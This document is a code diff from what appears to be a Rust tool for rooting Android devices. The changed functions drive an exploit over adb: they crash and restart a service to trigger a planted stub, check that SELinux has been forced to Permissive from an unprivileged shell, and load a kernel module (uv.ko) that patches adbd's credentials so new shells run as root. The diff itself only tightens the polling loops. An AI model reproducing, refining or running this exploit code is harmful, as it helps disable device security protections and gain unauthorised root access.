@@ -196,7 +196,7 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
     let pid0 = adb.sh(&format!("pidof {}", tsvc));
     adb.sh("dumpsys input >/dev/null 2>&1");
     let mut pid1 = pid0.clone();
-    for _ in 0..60 { ms(300); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
+    for _ in 0..180 { ms(100); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
     if pid1 == pid0 || pid1.is_empty() { stager.stop(); die(&format!("{} did not restart (pid still {}) — dump stub not hit", tsvc, pid0)); }
     ok(&format!("{} restarted  pid {} -> {}", tsvc, pid0, pid1));
     info(&format!("settling {}ms for the ctor's carrier/cfg poison to complete", settle_ms));
@@ -213,7 +213,7 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
 
     banner("VERIFY");
     let mut after = String::new();
-    for _ in 0..16 { ms(400); after = adb.sh("getenforce"); if after == "Permissive" { break; } }
+    for _ in 0..64 { ms(100); after = adb.sh("getenforce"); if after == "Permissive" { break; } }
     if after == "Permissive" {
         win(&format!("SELinux {} -> {}   (from uid={} shell, zero root)", before, after, adb.sh("id -u")));
         if verify_root { info(&format!("module: {}", { let m = adb.su(&format!("lsmod | grep {}", mod_name(&t.s(&["carrier", "device_path"])))); if m.is_empty() { "(not listed)".into() } else { m } })); }
@@ -305,7 +305,7 @@ fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path) {
     step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd");
     adb.sh(&format!("setprop ctl.start {}", t.s(&["services", "insmod_sh"])));
     let mut rooted = false;
-    for _ in 0..40 { ms(300); if adb.sh("id -u") == "0" { rooted = true; break; } }
+    for _ in 0..120 { ms(100); if adb.sh("id -u") == "0" { rooted = true; break; } }
     if !rooted { die("adb shell not root (uv.ko load failed?)"); }
     win(&format!("adbd (pid {}) cred-patched -> NEW adb shells are uid 0 + all caps + kernel context", pid));
     info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)");
@@ -429,7 +429,7 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     let pid0 = adb.sh(&format!("pidof {}", tsvc));
     adb.sh("dumpsys input >/dev/null 2>&1");
     let mut pid1 = pid0.clone();
-    for _ in 0..20 { secs(1); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
+    for _ in 0..200 { ms(100); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
     if pid1 == pid0 || pid1.is_empty() {
         err(&format!("{} did not restart (pid still {}) — dump stub not hit", tsvc, pid0));
         do_revert(&adb, &workdir, &mut reverted); stager.stop();
@@ -460,8 +460,8 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     banner("VERIFY  (enforcing flip + root)");
     let mut rooted = false;
     let mut uline = String::new();
-    for _ in 0..20 {
-        secs(1);
+    for _ in 0..100 {
+        ms(200);
         if adb_root { if adb.sh("id -u") == "0" { rooted = true; break; } }
         else if let Some(w) = &wsh { uline = adb.sh(&format!("grep -m1 Uid /proc/{}/status 2>/dev/null", w.pid.unwrap_or(0))); if uline.split_whitespace().nth(1) == Some("0") { rooted = true; break; } }
     }
